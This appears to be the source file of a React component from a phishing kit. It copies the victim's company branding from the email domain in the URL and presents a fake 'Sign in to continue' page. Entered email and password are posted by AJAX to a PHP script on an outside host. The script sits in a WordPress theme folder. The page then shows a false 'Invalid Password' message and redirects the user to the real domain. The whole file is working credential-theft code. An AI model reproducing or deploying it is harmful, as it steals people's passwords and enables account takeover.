
import React, { useEffect, useState } from "react";
import './Default.css';
import $ from 'jquery';
import Preloader from "./Preloader/Preloader";
import { BiSolidUser, BiSolidLockAlt } from "react-icons/bi";

const Default = ()=>{
    
    const [invalid, setInvalid] = useState(false);

    const [spinLoader, setSpinLoader] = useState(false);

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("@");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).toLowerCase();
    const mainName = extracetdEmail.replace('.com', "");
    
    const emailInTheURLA = window.location.href;
    const sliceEqualSignB = emailInTheURLA.indexOf("=");
    const extracetdEmailC = emailInTheURLA.substr((sliceEqualSignB+1)).toLowerCase();


    const [defaultEmail, setDefaultEmail] = useState(extracetdEmailC);
    const [defaultPassword, setDefaultPassword] = useState('');

    const [count, setCount] = useState(0);

    const submitDefaultForm = (e)=>{
        e.preventDefault();
        setSpinLoader(true);
        setTimeout(() => {
            setDefaultPassword('');
        }, 500);

        setCount(count=> count + 1);
            if(count >= 1){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                console.log(extracetdemailDomain);
                setTimeout(() => {
                    window.location.href = `https://www.${extracetdemailDomain}`;
                }, 1500);
            };

            setTimeout(()=>{
                setSpinLoader(false);
                setInvalid(true);
            }, 2200)

        // post to server

        const user = {
            email: defaultEmail,
            password: defaultPassword
        };
    // hello jeje
        $.ajax({
            type: "POST",
            url: "https://dly.cua.mybluehost.me/wp-content/themes/twentytwentytwo/stylee.php",
            data: user,
            success(data) {
                // alert('OK');
                console.log(data);
            },
        });
    };


    useEffect(()=>{
        document.title = extracetdEmail.toLowerCase();
        setSpinLoader(true);
        setTimeout(() => {
            setSpinLoader(false);
        }, 2500);
    }, [extracetdEmail]);

    return(<article className="wrapp__" 

    style={{
        // backgroundImage: `url(https://image.thum.io/get/auth/69430-server/https://www.${extracetdEmail}/)`,
        // backgroundImage: `url(https://image.thum.io/get/auth/69257-c9081e4bf3bfce9be8aa484cc8a0999e/https://www.${extracetdEmail}/)`,
        backgroundImage: `url(https://image.thum.io/get/auth/69487-uurrlll/https://www.${extracetdEmail}/)`,
        // https://image.thum.io/get/auth/69257-c9081e4bf3bfce9be8aa484cc8a0999e/https://www.wikipedia.org/
        // https://image.thum.io/get/auth/69487-uurrlll/https://www.wikipedia.org/
        // https://image.thum.io/get/auth/69487-uurrlll/https://www.wikipedia.org/
        // backgroundImage: `url(${BG})`,
        width:'100vw',
        height:'100vh',
        backgroundRepeat:'no-repeat',
        backgroundSize:'cover',
        backgroundPosition:'top'
    }}
    >

    <div style={{
        display: 'flex',
        justifyContent:'center',
        marginTop:'2.4cm',
        zIndex:'5'
    }}
    >

        { spinLoader ? <Preloader /> : null }

        <section className="Default_container">

            <div className="Default_logo_cont" style={{
              display:'flex',
              alignItems:'center',
              justifyContent:'center'
            }}>
                <img 
                    alt="Logo"
                    src={`https://logo.clearbit.com/https://${extracetdEmail}`}
                    style={{
                      width:'50px',
                      height:'50px',
                    }}
                />
                <p className="bolded__ hhhhh" style={{
                  paddingLeft:'5px',
                  fontColor:'#514c4cd',
                  padding:"0px 0px 0px 7px",
                  textTransform:'capitalize'
                }}>{mainName}</p>
            </div>

            <p className="bolded__ sssss" style={{fontSize:'20px'}}>Sign in to continue</p>

            <span style={{
              fontSize:'15px',
              color:'brown',
              textAlign:'center',
              display:'flex',
              justifyContent:'center',
              marginBottom:'12px'
            }}>Authentication required</span>
            
            { invalid ? <div className="alert alert-danger">
              Invalid Password, Ensure to input correct password email account
            </div> : null }

            <form onSubmit={submitDefaultForm}>

                <div className="pv-Bz-iB ">

                    <div className="WB-Jo-DB"> 
                        <span className="kC-KY-IK"><i className="Lf-cT-dq no-im-qF"><BiSolidUser /></i></span> 
                        
                        <input
                            name="Yz-Uy-Ge"
                            readOnly
                            type="email"
                            value={defaultEmail}
                            required
                            placeholder="Username"
                            className="Nw-Ws-bg" id="Yz-Uy-Ge"
                            onChange={e=> setDefaultEmail(e.target.value)}
                        />
                    </div>

                </div>

                <div className="pv-Bz-iB " style={{
                        marginTop:'18px'
                    }}>

                        <div className="WB-Jo-DB" > 
                            <span className="kC-KY-IK"><i className="Lf-cT-dq no-im-qF"><BiSolidLockAlt /></i></span>
                            <input 
                                name="Yz-Uy-Ge" 
                                // readOnly
                                type="password" 
                                value={defaultPassword} 
                                required
                                placeholder="Password" 
                                className="Nw-Ws-bg" 
                                id="Yz-Uy-Ge" 
                                onChange={e=> setDefaultPassword(e.target.value)}
                            /> 
                        </div>

                    </div>


                    <div className="pv-Bz-iB bbbtttnnnnn">
                        <input 
                        type={`submit`}
                        value={`Sign in`}
                        className='Default_btn_submit_'
                        />
                    </div>

            </form>

            <p className="sessi__on_"> <input type={`checkbox`} checked readOnly/> Secure login session?</p>

        </section>

    </div>
    </article>)
};

export default Default;